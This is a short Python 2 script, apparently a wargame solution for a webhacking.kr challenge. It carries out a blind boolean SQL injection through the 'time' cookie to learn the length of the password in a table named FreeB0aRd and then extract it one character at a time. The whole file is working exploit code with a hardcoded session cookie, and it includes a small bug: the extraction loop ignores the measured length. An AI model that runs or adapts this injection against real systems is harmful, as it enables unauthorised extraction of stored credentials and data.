from requests import *
FreeB0aRd_password = ""
URL  = 'http://webhacking.kr/challenge/web/web-02/index.php'
for i in range(0, 30):
    cookies = {'time': '1498214520 and (select length(password) from FreeB0aRd)='+str(i), 'PHPSESSID':'97c4416910f1f3a72a05352251ecc012'}
    res = get(URL, cookies=cookies)
    if "<!--2070-01-01 09:00:01-->" in res.text:
        print "[*] FreeB0aRd's Password lenght is %d" %i
        FreeB0aRd_Lenght = i
        break;

for i in range(1, 10):
    for j in range(0, 300):
        cookies = {'time': '1498214520 and (select ascii(substr(password,%d,1)) from FreeB0aRd)=%d' %(i, j), 'PHPSESSID':'97c4416910f1f3a72a05352251ecc012'}
        res = get(URL, cookies=cookies)
        if "<!--2070-01-01 09:00:01-->" in res.text:
            print "[*] FreeB0aRd's password is %s"  %chr(j)
            FreeB0aRd_password+=chr(j)
            break;
            
            
